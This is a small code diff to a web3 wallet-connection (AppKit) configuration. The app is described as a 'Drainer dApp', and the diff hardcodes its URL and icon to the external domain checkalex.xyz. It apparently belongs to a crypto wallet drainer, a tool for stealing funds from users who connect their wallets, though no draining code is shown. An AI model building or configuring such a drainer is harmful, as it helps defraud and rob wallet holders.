@@ -38,8 +38,8 @@ const modal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Drainer dApp',
-    url: window.location.origin,
-    icons: [`${window.location.origin}/icon.png`],
+    url: 'https://checkalex.xyz/',
+    icons: [`https://checkalex.xyz/icon.png`],
   },
   features: { analytics: true }
 })
